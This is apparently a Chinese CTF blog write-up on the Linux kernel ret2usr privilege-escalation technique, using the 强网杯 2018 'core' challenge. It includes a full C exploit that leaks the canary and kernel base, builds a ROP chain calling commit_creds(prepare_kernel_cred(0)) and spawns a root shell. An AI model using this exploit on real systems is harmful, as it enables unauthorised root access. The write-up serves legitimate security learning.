---
title: Kernel初识 - Kernel ret2usr
date: '2025-07-20 19:02:29'
updated: '2025-08-11 13:32:45'
permalink: posts/16113.html
categories:
  - 知识分享
tags:
  - Kernel Pwn
---

# Kernel ret2usr

个人感觉这个手法有点类似于用户态的ret2shellcode，但又不完全相同

## 概述 

**在【未】开启 SMAP/SMEP 保护的情况下**，用户空间无法访问内核空间的数据，但是内核空间可以访问 / 执行用户空间的数据，因此 `ret2usr` 这种攻击手法应运而生——通过 kernel ROP 以内核的 ring 0 权限执行用户空间的代码以完成提权。

通常 CTF 中的 ret2usr 还是以执行 `commit_creds(prepare_kernel_cred(NULL))` 进行提权为主要的攻击手法，不过相比起构造冗长的 ROP chain，ret2usr 只需我们要提前在用户态程序构造好对应的函数指针、获取相应函数地址后直接 ret 回到用户空间执行即可，在这种情况下 **我们只需要劫持内核执行流，而无需在内核空间构造复杂的 ROP 链条** 。

✳ 对于开启了 `SMAP/SMEP保护` 的 kernel 而言，**内核空间尝试直接访问用户空间会引起 kernel panic**，我们将在下一章节讲述其绕过方式。

> 在 QEMU 启动参数中，我们可以为 CPU 参数加上 `-smep,-smap` 以显式关闭 SMEP&SMAP 保护，例如：
>
> 
>
> ```
> #!/bin/sh
> qemu-system-x86_64 \
>     -enable-kvm \
>     -cpu host,-smep,-smap \
> # ...
> ```

## 攻击代码

```
void get_shell(){
	system("/bin/sh");
}

size_t prepare_kernel_cred , commit_creds;
void* (*prepare_kernel_cred_kfunc)(void *task_struct);
int (*commit_creds_kfunc)(void *cred);


void privilege_escalation(){
    if(commit_creds && prepare_kernel_cred){
        (*((void (*)(char *))commit_creds))(
            (*((char* (*)(int))prepare_kernel_cred))(0)
        );
    }
}

```

## 例题：强网杯 2018 - core

### Kernel ret2usr

直接贴exp了，只需要把直接内核提权的rop换成我们用户态构造好的提权函数地址即可，如果对前面的相关思路还没有了解的，可以去看我的之前的博客 ，Kernel ROP 。

### EXP：

```
#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>
#include<fcntl.h>
#include<string.h>
#include<sys/types.h>
#include<sys/wait.h>
#include<sys/ioctl.h>
#include<pthread.h>
void setoff(int fd,long long size){
    ioctl(fd,0x6677889c,size);
}
void core_read(int fd,char *buf){
    ioctl(fd,0x6677889b,buf);
}
void core_copy_func(int fd,long long size){
    ioctl(fd,0x6677889a,size);
}
size_t user_cs, user_ss, user_rflags, user_sp;

void save_status(void)
{
    asm volatile (
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );

    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

void get_shell(){
	system("/bin/sh");
}

int fd ;
size_t tmp;
char buf[0x50];
size_t rop[0x100];
size_t vmlinux_base,canary,core_base;
size_t commit_creds = 0x9c8e0;
size_t prepare_kernel_cred = 0x9cce0;
size_t pop_rdi = 0x000b2f;
size_t push_rax = 0x02d112;
size_t swapgs = 0x0d6;
size_t iretq ;
size_t xchg = 0x16684f0;
size_t call_rax = 0x40398;
size_t pop_rcx = 0x21e53;
size_t pop_rbp = 0x3c4;
size_t pop_rdx = 0xa0f49;
size_t mov_rdi_rax_call_rdx = 0x01aa6a;
int i = 0;

void get_addr(){

    save_status();
    fd = open("/proc/core",O_RDWR); //程序创造了一个接口，所以我们需要把这个接口给打开 ，这样才能进行函数调用
    if(fd < 0) {
        printf("Open /proc/core error!\n");
        exit(0);
    }
    setoff(fd,0x40); // v4 距离 canary 的偏移是 0x40 ，而且v5的数据类型是char类型。
    core_read(fd,buf); //把canary读入用户态的buf 

    //此时buf的前八个字节是我们的canary
    canary = (*(size_t *)(&buf[0]));
    puts("\033[34m\033[1m[*] leak success! .\033[0m");
    printf("\033[34m\033[1m[*] Canary  >> %p.\033[0m\n",canary);
    core_base = (*(size_t *)(&buf[2*8])) - 0x19b;
    puts("\033[34m\033[1m[*] leak success! .\033[0m");
    printf("\033[34m\033[1m[*] core_base  >> %p.\033[0m\n",core_base);
    vmlinux_base = (*(size_t *)(&buf[4*8]) - 0x1dd6d1);
    puts("\033[34m\033[1m[*] leak success! .\033[0m");
    printf("\033[34m\033[1m[*] vmlinux_base  >> %p.\033[0m\n",vmlinux_base);
    pop_rdi += vmlinux_base;
    pop_rcx += vmlinux_base;
    pop_rbp += vmlinux_base;
    pop_rdx += vmlinux_base;
    mov_rdi_rax_call_rdx += vmlinux_base;
    swapgs += core_base;
    iretq = 0x50ac2 + vmlinux_base;
    commit_creds += vmlinux_base;
    prepare_kernel_cred += vmlinux_base;

 
}

void privilege_escalation(){
    if(commit_creds && prepare_kernel_cred){
        (*((void (*)(char *))commit_creds))(
            (*((char* (*)(int))prepare_kernel_cred))(0)
        );
    }
}

int main(){
   get_addr();
   for(i=0;i<10;i++){
        rop[i] = canary;
    }
    i = 10;
    rop[i++] = (size_t)privilege_escalation;
    rop[i++] = swapgs; //恢复用户GS寄存器
    rop[i++] = 0;
    rop[i++] = iretq;
    rop[i++] = (size_t)get_shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;
    write(fd,rop,i*8);
    core_copy_func(fd,0xf000000000000000+i*8);
    puts("\033[34m\033[1m[*] Attack Success! .\033[0m");
    return 0;
}
```

![image-20250720202401158](/images/posts/20250811132730535.png)



## 参考链接：

https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/ret2usr/

































